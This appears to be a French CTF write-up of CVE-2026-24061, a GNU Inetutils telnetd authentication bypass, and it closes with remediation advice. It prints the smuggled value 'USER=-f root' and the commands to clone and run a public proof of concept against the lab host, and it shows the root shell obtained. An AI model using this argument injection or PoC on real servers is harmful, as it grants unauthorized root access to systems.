---
layout: single
header:
  overlay_image: /assets/images/banner-016.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Challenge Teletype : contournement d'authentification Telnet (CVE-2026-24061) — shell root sans mot de passe"
date: 2026-11-05
categories: [CTF, Exploit]
tags: [ctf, telnet, telnetd, cve-2026-24061, authentication-bypass, gnu-inetutils, new-environ, login, root, kali, golang, poc, mitre-attck]
---

**Cible :** `176.16.175.235` — TCP/23 (Telnet)  
**CVE :** CVE-2026-24061  
**Composant :** GNU Inetutils `telnetd` ≤ 2.7  
**Flag :** `flag_e450f3db_9de4_49ce_84d1_b95af62ce351`

---

## 1. Résultat du challenge

Shell **root** obtenu sur le serveur Linux `176.16.175.235` via Telnet sur TCP/23.

```
uid=0(root) gid=0(root) groups=0(root)
root
```

```
flag_e450f3db_9de4_49ce_84d1_b95af62ce351
```

> Les chemins indiqués pour les fichiers de flag étaient `/home/local.txt` et `/root/proof.txt`. Le contenu exact de `cat` n'a pas été inclus dans la capture partagée ; le flag ci-dessus a été fourni à la fin du challenge.

---

## 2. Explication de CVE-2026-24061

### Nature de la vulnérabilité

CVE-2026-24061 est un **contournement d'authentification à distance** affectant `telnetd` dans GNU Inetutils jusqu'à la version 2.7. Ce n'est pas un débordement de mémoire : le problème vient de la façon dont le serveur traite la variable d'environnement Telnet `USER` avant d'appeler le programme système `login`.

| Champ | Valeur |
|---|---|
| **CVE** | CVE-2026-24061 |
| **Composant** | GNU Inetutils `telnetd` ≤ 2.7 |
| **Type** | Contournement d'authentification (Auth Bypass) |
| **Vecteur** | Réseau — sans authentification préalable |
| **Impact** | Shell root sans mot de passe |

### Mécanisme

Telnet permet au client et au serveur de négocier des options. L'option **NEW-ENVIRON** peut notamment transporter des variables d'environnement. Dans le cas vulnérable, le client peut envoyer une valeur de `USER` spécialement construite :

```
USER=-f root
```

Le démon Telnet transmet cette valeur à `login` d'une manière où elle est interprétée comme des **arguments de commande**, plutôt que comme un simple nom d'utilisateur. Le résultat est équivalent à appeler :

```bash
login -f root
```

L'option `-f` indique à `login` que l'utilisateur est **déjà authentifié**. Avec `root` comme compte, cela ouvre une session root sans demander le mot de passe.

### Chaîne logique

```
Client Telnet
  → envoie USER=-f root via NEW-ENVIRON
  → telnetd vulnérable transmet la valeur à login comme arguments
  → login interprète -f comme "authentification déjà effectuée"
  → ouverture d'un shell sous root
```

---

## 3. Étapes, commandes et sorties

### 3.1 Installer les outils sur Kali / Ubuntu

```bash
sudo apt-get update
sudo apt-get install -y git golang-go
```

| Paquet | Rôle |
|---|---|
| `git` | Récupérer le dépôt du PoC |
| `golang-go` | Compiler et exécuter `poc.go` |

### 3.2 Récupérer le PoC et le lancer contre la cible

```bash
git clone https://github.com/Chocapikk/CVE-2026-24061.git
cd CVE-2026-24061
go run poc.go 176.16.175.235 23
```

**Explication des commandes :**

- `git clone` : récupère le code du PoC depuis GitHub
- `cd CVE-2026-24061` : place le terminal dans le répertoire téléchargé
- `go run poc.go 176.16.175.235 23` : compile et exécute le PoC — premier argument = IP cible, second = port Telnet

Le PoC négocie les options Telnet et envoie la variable `USER=-f root` via NEW-ENVIRON pour déclencher le contournement d'authentification.

**Invite obtenue après exécution :**

```
root@ip-176-16-175-235:~#
```

### 3.3 Confirmer les privilèges obtenus

```bash
id
whoami
```

**Sorties observées :**

```
uid=0(root) gid=0(root) groups=0(root)
root
```

| Commande | Sortie | Signification |
|---|---|---|
| `id` | `uid=0(root)` | UID 0 = superutilisateur Linux |
| `whoami` | `root` | Confirmation du compte effectif |

### 3.4 Lire les fichiers de flag

```bash
cat /home/local.txt /root/proof.txt
```

`cat` lit les fichiers et écrit leur contenu dans le terminal. Les deux chemins sont passés ensemble pour vérifier les deux emplacements connus en une seule commande.

**Flag :**

```
flag_e450f3db_9de4_49ce_84d1_b95af62ce351
```

---

## 4. Commande de recherche préalable (et ses limites)

Avant de connaître l'emplacement exact des fichiers, la commande suivante avait été lancée :

```bash
find / -type f -iname '*flag*' 2>/dev/null
```

**Explication des options :**

| Option | Rôle |
|---|---|
| `/` | Cherche depuis la racine du système |
| `-type f` | Limite aux fichiers ordinaires (exclut dossiers, liens) |
| `-iname '*flag*'` | Filtre sur les noms contenant `flag` (insensible à la casse) |
| `2>/dev/null` | Masque les erreurs de permission |

**Sorties observées (fichiers système, non pertinents) :**

```
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
```

> **Limite :** ces lignes sont des fichiers système dont le nom contient `flag` ou `flags`, pas le flag du challenge. Les fichiers du challenge s'appellent `local.txt` et `proof.txt` — leur nom ne contient pas `flag`, donc ce filtre de recherche ne pouvait pas les faire ressortir. Une fois les chemins connus, la commande pertinente était directement `cat /home/local.txt /root/proof.txt`.

---

## 5. Conclusion

CVE-2026-24061 illustre un cas classique d'**injection d'argument** : une valeur contrôlée par l'attaquant est transmise à un programme système sans assainissement, permettant de modifier le comportement attendu. Ici, l'option `-f` de `login` est détournée pour sauter entièrement l'étape de vérification du mot de passe.

**Conditions nécessaires à l'exploitation :**

- Port Telnet (23/TCP) accessible sur le réseau
- `telnetd` de GNU Inetutils en version ≤ 2.7
- Support de l'option NEW-ENVIRON activé (comportement par défaut)

**Remédiation :**

- ✅ Mettre à jour GNU Inetutils vers la version **≥ 2.8**
- ✅ Désactiver Telnet et le remplacer par **SSH**
- ✅ Bloquer le port 23 au niveau du pare-feu si le service n'est pas nécessaire

### 🏁 Flag final

```
flag_e450f3db_9de4_49ce_84d1_b95af62ce351
```

---

## Références

| Source | Lien |
|---|---|
| NVD — CVE-2026-24061 | https://nvd.nist.gov/vuln/detail/cve-2026-24061 |
| PoC public — Chocapikk/CVE-2026-24061 | https://github.com/Chocapikk/CVE-2026-24061 |
